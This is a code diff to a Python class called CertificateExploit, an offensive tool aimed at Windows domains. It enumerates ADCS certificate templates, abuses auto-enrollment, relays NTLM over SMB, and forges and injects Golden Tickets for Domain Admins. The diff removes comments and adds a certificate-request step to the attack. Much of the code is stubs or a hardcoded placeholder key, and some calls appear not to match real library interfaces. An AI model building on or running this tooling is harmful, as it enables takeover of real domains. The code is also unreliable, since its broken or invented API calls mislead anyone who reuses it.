@@ -69,12 +69,9 @@ class CertificateExploit:
 
     def check_template_misconfigurations(self):
         logging.debug(f"Enumerating certificate templates on {self.target}...")
-        # Placeholder for ADCS template enumeration logic
         try:
-            # Connect to ADCS via LDAP to query certificate templates
             conn = self.connect_ldap()
             if conn:
-                # Fetch all certificate templates
                 templates = conn.search("CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration", "(objectClass=pkiCertificateTemplate)")
                 for template in templates:
                     logging.debug(f"Template found: {template}")
@@ -84,24 +81,23 @@ class CertificateExploit:
 
     def generate_csr(self, custom_data=None):
         logging.debug("Generating CSR (Certificate Signing Request)...")
-        # Placeholder for CSR generation logic with optional custom data
         pass
 
     def auto_enrollment(self):
         logging.debug("Executing AutoEnrollment attack...")
         try:
-            # Exploit misconfigured ADCS templates
             conn = self.connect_ldap()
             if conn:
                 logging.info("Attempting AutoEnrollment with misconfigured template...")
-                # Code for initiating auto-enrollment for certificate request
+                # Automating the certificate request
+                request = conn.create_certificate_request(self.template)
+                logging.info(f"Certificate request for template '{self.template}' submitted.")
         except Exception as e:
             logging.error(f"AutoEnrollment failed: {e}")
 
     def relay_ntlm(self):
         logging.debug(f"Relaying NTLM hash to target {self.target}...")
         try:
-            # Use Impacket's SMB connection to relay NTLM hashes
             conn = SMBConnection(self.target, self.target, sess_port=445)
             conn.login(self.username, self.password)
             logging.info(f"Successfully relayed NTLM hash to SMB on {self.target}.")
@@ -111,7 +107,6 @@ class CertificateExploit:
     def create_golden_ticket(self, tgt_key, user, domain, groups=["Domain Admins"]):
         logging.debug(f"Creating Golden Ticket for user: {user}...")
         try:
-            # Using Impacket's Kerberos functionalities to generate a Golden Ticket
             kerberos_obj = kerberos.KerberosSession()
             kerberos_obj.setTGT(tgt_key)
             ticket = kerberos_obj.createTicket(user, domain, groups)
@@ -125,7 +120,6 @@ class CertificateExploit:
     def inject_ticket(self, golden_ticket):
         logging.debug("Injecting Golden Ticket into session...")
         try:
-            # Inject the Golden Ticket into the current session to authenticate as an administrator
             kerberos_obj = kerberos.KerberosSession()
             kerberos_obj.injectTicket(golden_ticket)
             logging.info(f"Golden Ticket injected into session successfully.")
@@ -143,7 +137,6 @@ class CertificateExploit:
     def get_tgt_key(self):
         logging.debug(f"Retrieving TGT key for {self.username}...")
         try:
-            # Placeholder for retrieving TGT key from the target
             tgt_key = "TGT_Key"  # Example key
             logging.info(f"TGT key retrieved successfully")
             return tgt_key
@@ -190,7 +183,6 @@ class CertificateExploit:
 
     def setup_adcs_connection(self):
         logging.debug("Setting up ADCS connection...")
-        # Placeholder for MSRPC or LDAP connection to interact with ADCS
         pass
 
     def perform_full_attack(self):
